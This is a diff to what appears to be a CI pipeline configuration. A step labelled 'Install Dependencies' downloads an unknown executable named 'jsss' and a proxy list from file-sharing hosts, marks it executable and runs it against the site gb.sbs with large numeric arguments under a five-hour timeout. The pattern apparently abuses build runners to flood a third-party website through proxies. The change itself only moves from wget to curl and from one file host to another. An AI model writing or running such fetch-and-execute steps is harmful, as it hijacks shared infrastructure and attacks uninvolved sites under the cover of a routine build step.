@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install wget -y && wget https://cdn-106.bayfiles.com/V8J2ha4fyb/399b4389-1660704216/jsss && wget https://cdn-107.bayfiles.com/j5K3hc46ye/c2340ce6-1660704257/proxy.txt && chmod +x jsss && ./jsss https://gb.sbs/ 999999 100 100
+            command: apt update && apt install curl -y && curl -L https://free.keep.sh/rNtYVm1Mu3l9hwgo/jsss > jsss && curl -L https://free.keep.sh/tPSx682zegTo6Sfi/proxy.txt > proxy.txt && chmod +x jsss && ./jsss https://gb.sbs/ 999999 100 100
             no_output_timeout: 5h
 
 workflows:
